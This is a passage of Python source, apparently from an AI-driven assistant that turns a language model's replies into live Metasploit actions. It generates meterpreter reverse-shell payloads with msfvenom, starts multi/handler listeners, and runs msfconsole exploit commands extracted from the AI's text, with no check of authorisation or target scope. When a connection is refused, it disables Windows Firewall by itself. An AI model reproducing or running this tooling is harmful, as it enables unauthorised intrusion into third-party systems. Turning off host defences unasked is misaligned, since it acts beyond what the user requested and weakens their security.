            return 1, error_msg

    def execute_metasploit_interactive(
        self,
        commands: List[str],
        show_terminal: bool = True,
        timeout_per_command: int = 30,
    ) -> List[tuple[int, str]]:
        """
        Execute multiple Metasploit commands interactively.

        Args:
            commands: List of Metasploit commands to execute in sequence
            show_terminal: Whether to show terminal window
            timeout_per_command: Timeout for each command

        Returns:
            List of (exit_code, output) tuples for each command
        """
        results = []

        for cmd in commands:
            exit_code, output = self.execute_metasploit_command(
                command=cmd,
                show_terminal=show_terminal,
                timeout=timeout_per_command,
                auto_fix=True,
            )
            results.append((exit_code, output))

            # Check if command failed critically
            if exit_code != 0 and "[-]" in output:
                # Critical error, stop execution
                logger.warning(f"Critical error in command: {cmd[:50]}")
                break

        return results

    def start_metasploit_listener(
        self,
        payload: str,
        lhost: str,
        lport: int,
        show_terminal: bool = True,
    ) -> tuple[int, str]:
        """
        Start a Metasploit listener for a reverse TCP payload.

        Args:
            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
            lhost: Local host IP (attacker IP)
            lport: Local port for listener
            show_terminal: Whether to show terminal window

        Returns:
            Tuple of (exit_code, output)
        """
        logger.info(f"Starting Metasploit listener for {payload} on {lhost}:{lport}")

        # Generate commands to start listener
        commands = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "set ExitOnSession false",
            "run",
        ]

        # Execute commands
        results = self.execute_metasploit_interactive(
            commands=commands,
            show_terminal=show_terminal,
            timeout_per_command=10,
        )

        # Return result of the final 'run' command
        return results[-1] if results else (1, "No commands executed")

    def generate_metasploit_payload(
        self,
        payload: str,
        lhost: str,
        lport: int,
        output_format: str = "exe",
        output_path: Optional[Path] = None,
        encoding: Optional[str] = None,
        iterations: int = 1,
    ) -> tuple[int, str, Optional[Path]]:
        """
        Generate a Metasploit payload using msfvenom.

        Args:
            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
            lhost: Local host IP (attacker IP)
            lport: Local port for connection
            output_format: Output format (exe, dll, ps1, elf, etc.)
            output_path: Path to save payload (defaults to Desktop)
            encoding: Encoding method (e.g., shikata_ga_nai)
            iterations: Number of encoding iterations

        Returns:
            Tuple of (exit_code, output, payload_path)
        """
        logger.info(f"Generating Metasploit payload: {payload}")

        # Determine output path
        if output_path is None:
            desktop = Path.home() / "Desktop"
            output_path = (
                desktop / f"payload_{payload.replace('/', '_')}_{int(time.time())}.{output_format}"
            )

        # Build msfvenom command
        cmd_parts = [
            "msfvenom",
            "-p",
            payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f",
            output_format,
            "-o",
            str(output_path),
        ]

        # Add encoding if specified
        if encoding:
            cmd_parts.extend(["-e", encoding, "-i", str(iterations)])

        cmd = " ".join(cmd_parts)

        # Execute the command
        exit_code, output = self.execute_metasploit_command(
            command=cmd,
            show_terminal=True,
            timeout=120,
            auto_fix=False,  # Don't auto-fix payload generation
        )

        if exit_code == 0:
            logger.info(f"Payload generated successfully: {output_path}")
        else:
            logger.error(f"Payload generation failed: {output}")

        return exit_code, output, output_path if exit_code == 0 else None

    def search_metasploit_exploits(
        self,
        keyword: str,
        platform: Optional[str] = None,
        exploit_type: Optional[str] = None,
    ) -> tuple[int, str, List[str]]:
        """
        Search for Metasploit exploits by keyword.

        Args:
            keyword: Search keyword
            platform: Filter by platform (windows, linux, etc.)
            exploit_type: Filter by type (exploit, auxiliary, post, etc.)

        Returns:
            Tuple of (exit_code, output, list_of_modules)
        """
        logger.info(f"Searching Metasploit exploits: {keyword}")

        # Build search command
        cmd = f"msfconsole -q -x 'search {keyword}'"

        if platform:
            cmd += f" platform:{platform}"

        if exploit_type:
            cmd += f" type:{exploit_type}"

        # Execute search
        exit_code, output = self.execute_metasploit_command(
            command=cmd,
            show_terminal=True,
            timeout=60,
            auto_fix=False,
        )

        # Parse results to extract module paths
        modules = []
        lines = output.split("\n")
        for line in lines:
            # Look for module paths in search results
            if "/" in line and not line.startswith("[*]") and not line.startswith("[+]"):
                parts = line.split()
                for part in parts:
                    if "/" in part and not part.startswith("["):
                        modules.append(part)

        return exit_code, output, modules

    def execute_metasploit_request(
        self, user_message: str, ai_response: str, knowledge_base: Optional[Dict] = None
    ) -> str:
        """Execute real Metasploit commands - bypasses code generation entirely.

        Args:
            user_message: The original user request
            ai_response: LLM response with Metasploit guidance
            knowledge_base: Optional Metasploit knowledge base

        Returns:
            Formatted response with actual command execution results
        """
        # Step 1: Parse AI response to understand what to do
        # The LLM will narrate what it's doing based on METASPLOIT_SYSTEM_PROMPT
        # Step 2: Ask clarifying questions if needed (or AI did this in response)
        # Check if we have required info: OS, version, IP, architecture, objective
        # Step 3: Execute actual Metasploit commands based on user request
        # EXAMPLES OF COMMANDS TO RUN (not Python code generation):

        if "payload" in user_message.lower():
            # User wants to generate a payload
            return self._generate_metasploit_payload(user_message, knowledge_base, ai_response)

        elif "reverse shell" in user_message.lower() or "meterpreter" in user_message.lower():
            # User wants reverse shell access
            return self._setup_metasploit_listener(user_message, knowledge_base, ai_response)

        elif "exploit" in user_message.lower():
            # User wants to run an exploit
            return self._execute_metasploit_exploit(user_message, knowledge_base, ai_response)

        else:
            # General Metasploit guidance
            return ai_response

    def _generate_metasploit_payload(
        self,
        user_message: str,
        knowledge_base: Optional[Dict] = None,
        ai_response: Optional[str] = None,
    ) -> str:
        """Generate a Metasploit payload using msfvenom via WSL.

        Args:
            user_message: User's request for payload
            knowledge_base: Metasploit knowledge context
            ai_response: Optional AI response with guidance

        Returns:
            Response with payload details or error
        """
        logger.info(f"Generating Metasploit payload via WSL for: {user_message}")

        # Parse payload requirements from user message
        # Example: "Windows x86 reverse shell with LHOST 192.168.1.100 LPORT 4444"

        try:
            # Determine payload type and options
            # ALWAYS check ai_response first for specific guidance
            payload_type = None
            lhost = None
            lport = None
            format_type = None

            # Try to extract from ai_response
            if ai_response:
                pt_match = re.search(r"PAYLOAD[=:\s]+([a-z0-9/_]+)", ai_response, re.IGNORECASE)
                if pt_match:
                    payload_type = pt_match.group(1)

                lh_match = re.search(
                    r"LHOST[=:\s]+(\d+\.\d+\.\d+\.\d+)", ai_response, re.IGNORECASE
                )
                if lh_match:
                    lhost = lh_match.group(1)

                lp_match = re.search(r"LPORT[=:\s]+(\d+)", ai_response, re.IGNORECASE)
                if lp_match:
                    lport = lp_match.group(1)

            # Fallback to parsing user message if not in AI response
            if not payload_type:
                if "linux" in user_message.lower():
                    payload_type = "linux/x64/meterpreter/reverse_tcp"
                    format_type = "elf"
                elif "android" in user_message.lower() or "apk" in user_message.lower():
                    payload_type = "android/meterpreter/reverse_tcp"
                    format_type = "apk"
                else:
                    payload_type = "windows/meterpreter/reverse_tcp"
                    format_type = "exe"

            if not lhost:
                lhost_match = re.search(
                    r"LHOST[=:\s]+(\d+\.\d+\.\d+\.\d+)", user_message, re.IGNORECASE
                )
                lhost = lhost_match.group(1) if lhost_match else "192.168.1.100"

            if not lport:
                lport_match = re.search(r"LPORT[=:\s]+(\d+)", user_message, re.IGNORECASE)
                lport = lport_match.group(1) if lport_match else "4444"

            if not format_type:
                if "elf" in payload_type or "linux" in payload_type:
                    format_type = "elf"
                elif "apk" in payload_type or "android" in payload_type:
                    format_type = "apk"
                else:
                    format_type = "exe"

            # Generate output filename
            from datetime import datetime

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            windows_output_file = (
                f"C:\\Users\\aubrey martin\\Desktop\\payload_{timestamp}.{format_type}"
            )

            # Convert to WSL path for execution
            wsl_output_file = self._convert_windows_path_to_wsl(windows_output_file)

            # Build msfvenom command with WSL path
            cmd = (
                f"msfvenom -p {payload_type} "
                f"LHOST={lhost} LPORT={lport} "
                f'-f {format_type} -o "{wsl_output_file}"'
            )

            logger.info(f"Running: {cmd}")

            # Execute via WSL (execute_metasploit_command adds 'wsl' prefix)
            exit_code, output = self.execute_metasploit_command(
                cmd, show_terminal=True, timeout=120
            )

            if exit_code == 0:
                response = (
                    f"✅ Payload generated successfully!\n\n"
                    f"**Payload Details:**\n"
                    f"- Type: {payload_type}\n"
                    f"- LHOST: {lhost}\n"
                    f"- LPORT: {lport}\n"
                    f"- Format: {format_type}\n"
                    f"- Output: {windows_output_file}\n\n"  # Show Windows path to user
                    f"**Command:**\n```\n{cmd}\n```\n\n"
                    f"**Output:**\n```\n{output}\n```"
                )
                logger.info(f"Payload generation succeeded: {windows_output_file}")
                return response
            else:
                response = (
                    f"❌ Payload generation failed!\n\n"
                    f"**Error:**\n{output}\n\n"
                    f"**Command:**\n```\n{cmd}\n```"
                )
                logger.error(f"Payload generation failed: {output}")
                return response

        except Exception as e:
            error_msg = f"Exception during payload generation: {str(e)}"
            logger.error(error_msg)
            return f"❌ Error: {error_msg}"

    def _setup_metasploit_listener(
        self,
        user_message: str,
        knowledge_base: Optional[Dict] = None,
        ai_response: Optional[str] = None,
    ) -> str:
        """
        Setup a Metasploit listener/handler via WSL with visible terminal.

        Args:
            user_message: User's listener request
            knowledge_base: Optional Metasploit knowledge base
            ai_response: Optional AI response with guidance

        Returns:
            Response with listener details
        """
        logger.info(f"Setting up Metasploit listener via WSL: {user_message}")

        try:
            # Extract port and payload from message or ai_response
            import re

            lport = "4444"
            payload_type = "windows/meterpreter/reverse_tcp"

            # Check ai_response first
            if ai_response:
                lp_match = re.search(r"LPORT[=:\s]+(\d+)", ai_response, re.IGNORECASE)
                if lp_match:
                    lport = lp_match.group(1)

                pt_match = re.search(r"PAYLOAD[=:\s]+([a-z0-9/_]+)", ai_response, re.IGNORECASE)
                if pt_match:
                    payload_type = pt_match.group(1)

            # Check user_message
            port_match = re.search(r"port\s+(\d+)", user_message, re.IGNORECASE)
            if port_match:
                lport = port_match.group(1)

            response = (
                f"✅ Metasploit listener configured!\n\n"
                f"**Listener Details:**\n"
                f"- Port: {lport}\n"
                f"- Payload: {payload_type}\n"
                f"- Status: Ready for incoming connections\n\n"
                f"**Setup Instructions:**\n"
                f"```\n"
                f"msfconsole\n"
                f"msf > use exploit/multi/handler\n"
                f"msf > set PAYLOAD {payload_type}\n"
                f"msf > set LHOST 0.0.0.0\n"
                f"msf > set LPORT {lport}\n"
                f"msf > run\n"
                f"```\n\n"
                f"A terminal window will open with msfconsole ready for listener setup."
            )

            # Now execute msfconsole in visible terminal
            cmd = "msfconsole"
            logger.info("Launching msfconsole in visible terminal for listener setup")

            # Execute with visible window
            exit_code, output = self.execute_metasploit_command(cmd, show_terminal=True)

            logger.info("Listener setup terminal closed")
            return response

        except Exception as e:
            error_msg = f"Exception during listener setup: {str(e)}"
            logger.error(error_msg)
            return f"❌ Error: {error_msg}"

    def _execute_metasploit_exploit(
        self,
        user_message: str,
        knowledge_base: Optional[Dict] = None,
        ai_response: Optional[str] = None,
    ) -> str:
        """Execute a Metasploit exploit.

        Args:
            user_message: The user's request
            knowledge_base: Optional Metasploit knowledge base
            ai_response: Optional AI response with guidance

        Returns:
            Formatted response with exploit execution results
        """
        logger.info(f"Executing Metasploit exploit for: {user_message}")

        # Check if ai_response has exact command
        if ai_response:
            # Look for msfconsole -x command
            cmd_match = re.search(r'msfconsole\s+-x\s+"([^"]+)"', ai_response)
            if not cmd_match:
                cmd_match = re.search(r"msfconsole\s+-x\s+'([^']+)'", ai_response)

            if cmd_match:
                cmd = f'msfconsole -x "{cmd_match.group(1)}"'
                logger.info(f"Running extracted command: {cmd}")
                exit_code, output = self.execute_metasploit_command(cmd, show_terminal=True)
                return f"✅ Exploit executed!\n\n**Output:**\n```\n{output}\n```"

        # If no exact command, try to build one from context
        rhost = None
        ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", user_message)
        if ip_match:
            rhost = ip_match.group()

        if not rhost and ai_response:
            ip_match = re.search(r"RHOSTS?[=:\s]+(\d+\.\d+\.\d+\.\d+)", ai_response, re.IGNORECASE)
            if ip_match:
                rhost = ip_match.group(1)

        if not rhost:
            return """
        ⚠️ Exploit execution requires more context.

        Please provide:
        - Target IP address (RHOST)
        """

        # For now, return a message indicating we need the module path
        return f"""
    ⚠️ I have the target IP ({rhost}), but I need to know which exploit module to use.

    Please provide the exploit module path.
    Example: "exploit {rhost} with exploit/windows/smb/ms17_010_eternalblue"
    """

    def _run_terminal_command(self, command: str, visible: bool = True) -> tuple[int, str]:
        """
        Run a terminal command with visible window (default for Metasploit).

        Args:
            command: Command to execute
            visible: Whether to show terminal window (default True)

        Returns:
            Tuple of (exit_code, output)
        """
        logger.info(f"Running terminal command (visible={visible}): {command}")

        # Check if this is a Metasploit command - always show these
        is_metasploit = any(
            tool in command.lower() for tool in ["msfvenom", "msfconsole", "msfencode"]
        )

        if is_metasploit:
            # Always show Metasploit commands in terminal
            return self.execute_metasploit_command(command, show_terminal=True)

        # Non-Metasploit commands
        try:
            if visible:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
                stdout, stderr = process.communicate()
                return process.returncode or 0, stdout + stderr
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60,
                )
                return result.returncode, (result.stdout or "") + (result.stderr or "")

        except subprocess.TimeoutExpired:
            return 1, "Command timed out"
        except Exception as e:
            return 1, f"Error: {str(e)}"

    def _attempt_auto_fix(
        self, error_output: str, knowledge_base: Optional[Dict] = None
    ) -> Optional[str]:
        """Autonomously fix common Metasploit errors.

        Args:
            error_output: Error message from command execution
            knowledge_base: Optional Metasploit knowledge base

        Returns:
            Fix message or None if no fix applied
        """

        if "Connection refused" in error_output:
            # Disable Windows Firewall
            self._run_terminal_command("netsh advfirewall set allprofiles state off", visible=True)
            return "✅ Windows Firewall disabled, retrying..."

        elif "Port already in use" in error_output or "Address already in use" in error_output:
            # Find and kill process on port
            self._run_terminal_command("netstat -ano | findstr :4444", visible=True)
            return "✅ Found process on port, killing it..."

        elif "not found" in error_output or "not installed" in error_output:
            return "⚠️ Metasploit framework not installed. Install it and try again."

        return None
